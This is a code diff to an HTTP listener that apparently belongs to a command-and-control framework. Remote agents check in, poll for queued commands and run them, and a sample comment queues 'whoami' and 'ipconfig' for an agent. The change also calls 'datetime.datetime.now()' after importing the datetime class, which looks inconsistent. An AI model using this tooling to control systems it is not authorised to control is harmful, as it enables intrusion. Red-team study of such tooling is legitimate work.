@@ -7,6 +7,8 @@ import re
 import os
 import json
 from datetime import datetime
+from libs.agents.agent import *
+from libs.utils.utils import *
 
 class HTTP_Handler:
 
@@ -45,15 +47,15 @@ class HTTP_Handler:
                     agent_id = request.headers.get("Identifier")
                     all_id = [agent.id for agent in self.agents_using_listener]
                     if agent_id not in all_id:
-                        print("Adding agent")
+                        log_info("Agent checkin","listener")
                         agent = Agent(None,agent_id)
                         self.agents_using_listener.append(agent)
                         return "True"
                 else:
-                    print("No identifier")
+                    log_info("No identifier specified for adding agent","listener")
             else:
-                print("Auth not valid")
-            print("Rejecting Agent")
+                log_info("Authentication not valid for adding agent","listener")
+            log_info("Agent rejected","listener")
             return "False"
         
         @listener.route("/command",methods=["GET"])
@@ -65,9 +67,10 @@ class HTTP_Handler:
                     for agent in self.agents_using_listener:
                         if agent.id == agent_id:
                             agent_connected = True
-                            agent.last_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                            agent.last_seen = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                             if len(agent.command_queue)>0:
                                 command_to_run = agent.command_queue.pop(0)
+                                command_to_run = json.dumps(command_to_run)
                             else:
                                 command_to_run = ""
                             return command_to_run
@@ -107,7 +110,7 @@ class HTTP_Handler:
             if self._is_admin_authorization_valid(request.headers):
                 all_agents = {agent.id:agent for agent in self.agents_using_listener}
                 data = request.get_data()
-                data = json.loads(data) # {"azerty1":["ls","whoami"]}
+                data = json.loads(data) # {"azerty1":[{"method":"run","arguments":["whoami"]},{"method":"run","arguments":["ipconfig"]}]} OLD
                 for agent_id in data.keys():
                     if agent_id in all_agents.keys():
                         commands = data[agent_id]
@@ -123,7 +126,7 @@ class HTTP_Handler:
                 dict_of_agents = {}
                 for agent in self.get_all_agents():
                     dict_of_agents[agent.id]=agent.__dict__
-                return str(dict_of_agents)
+                return json.dumps(dict_of_agents)
 
             return ""
 
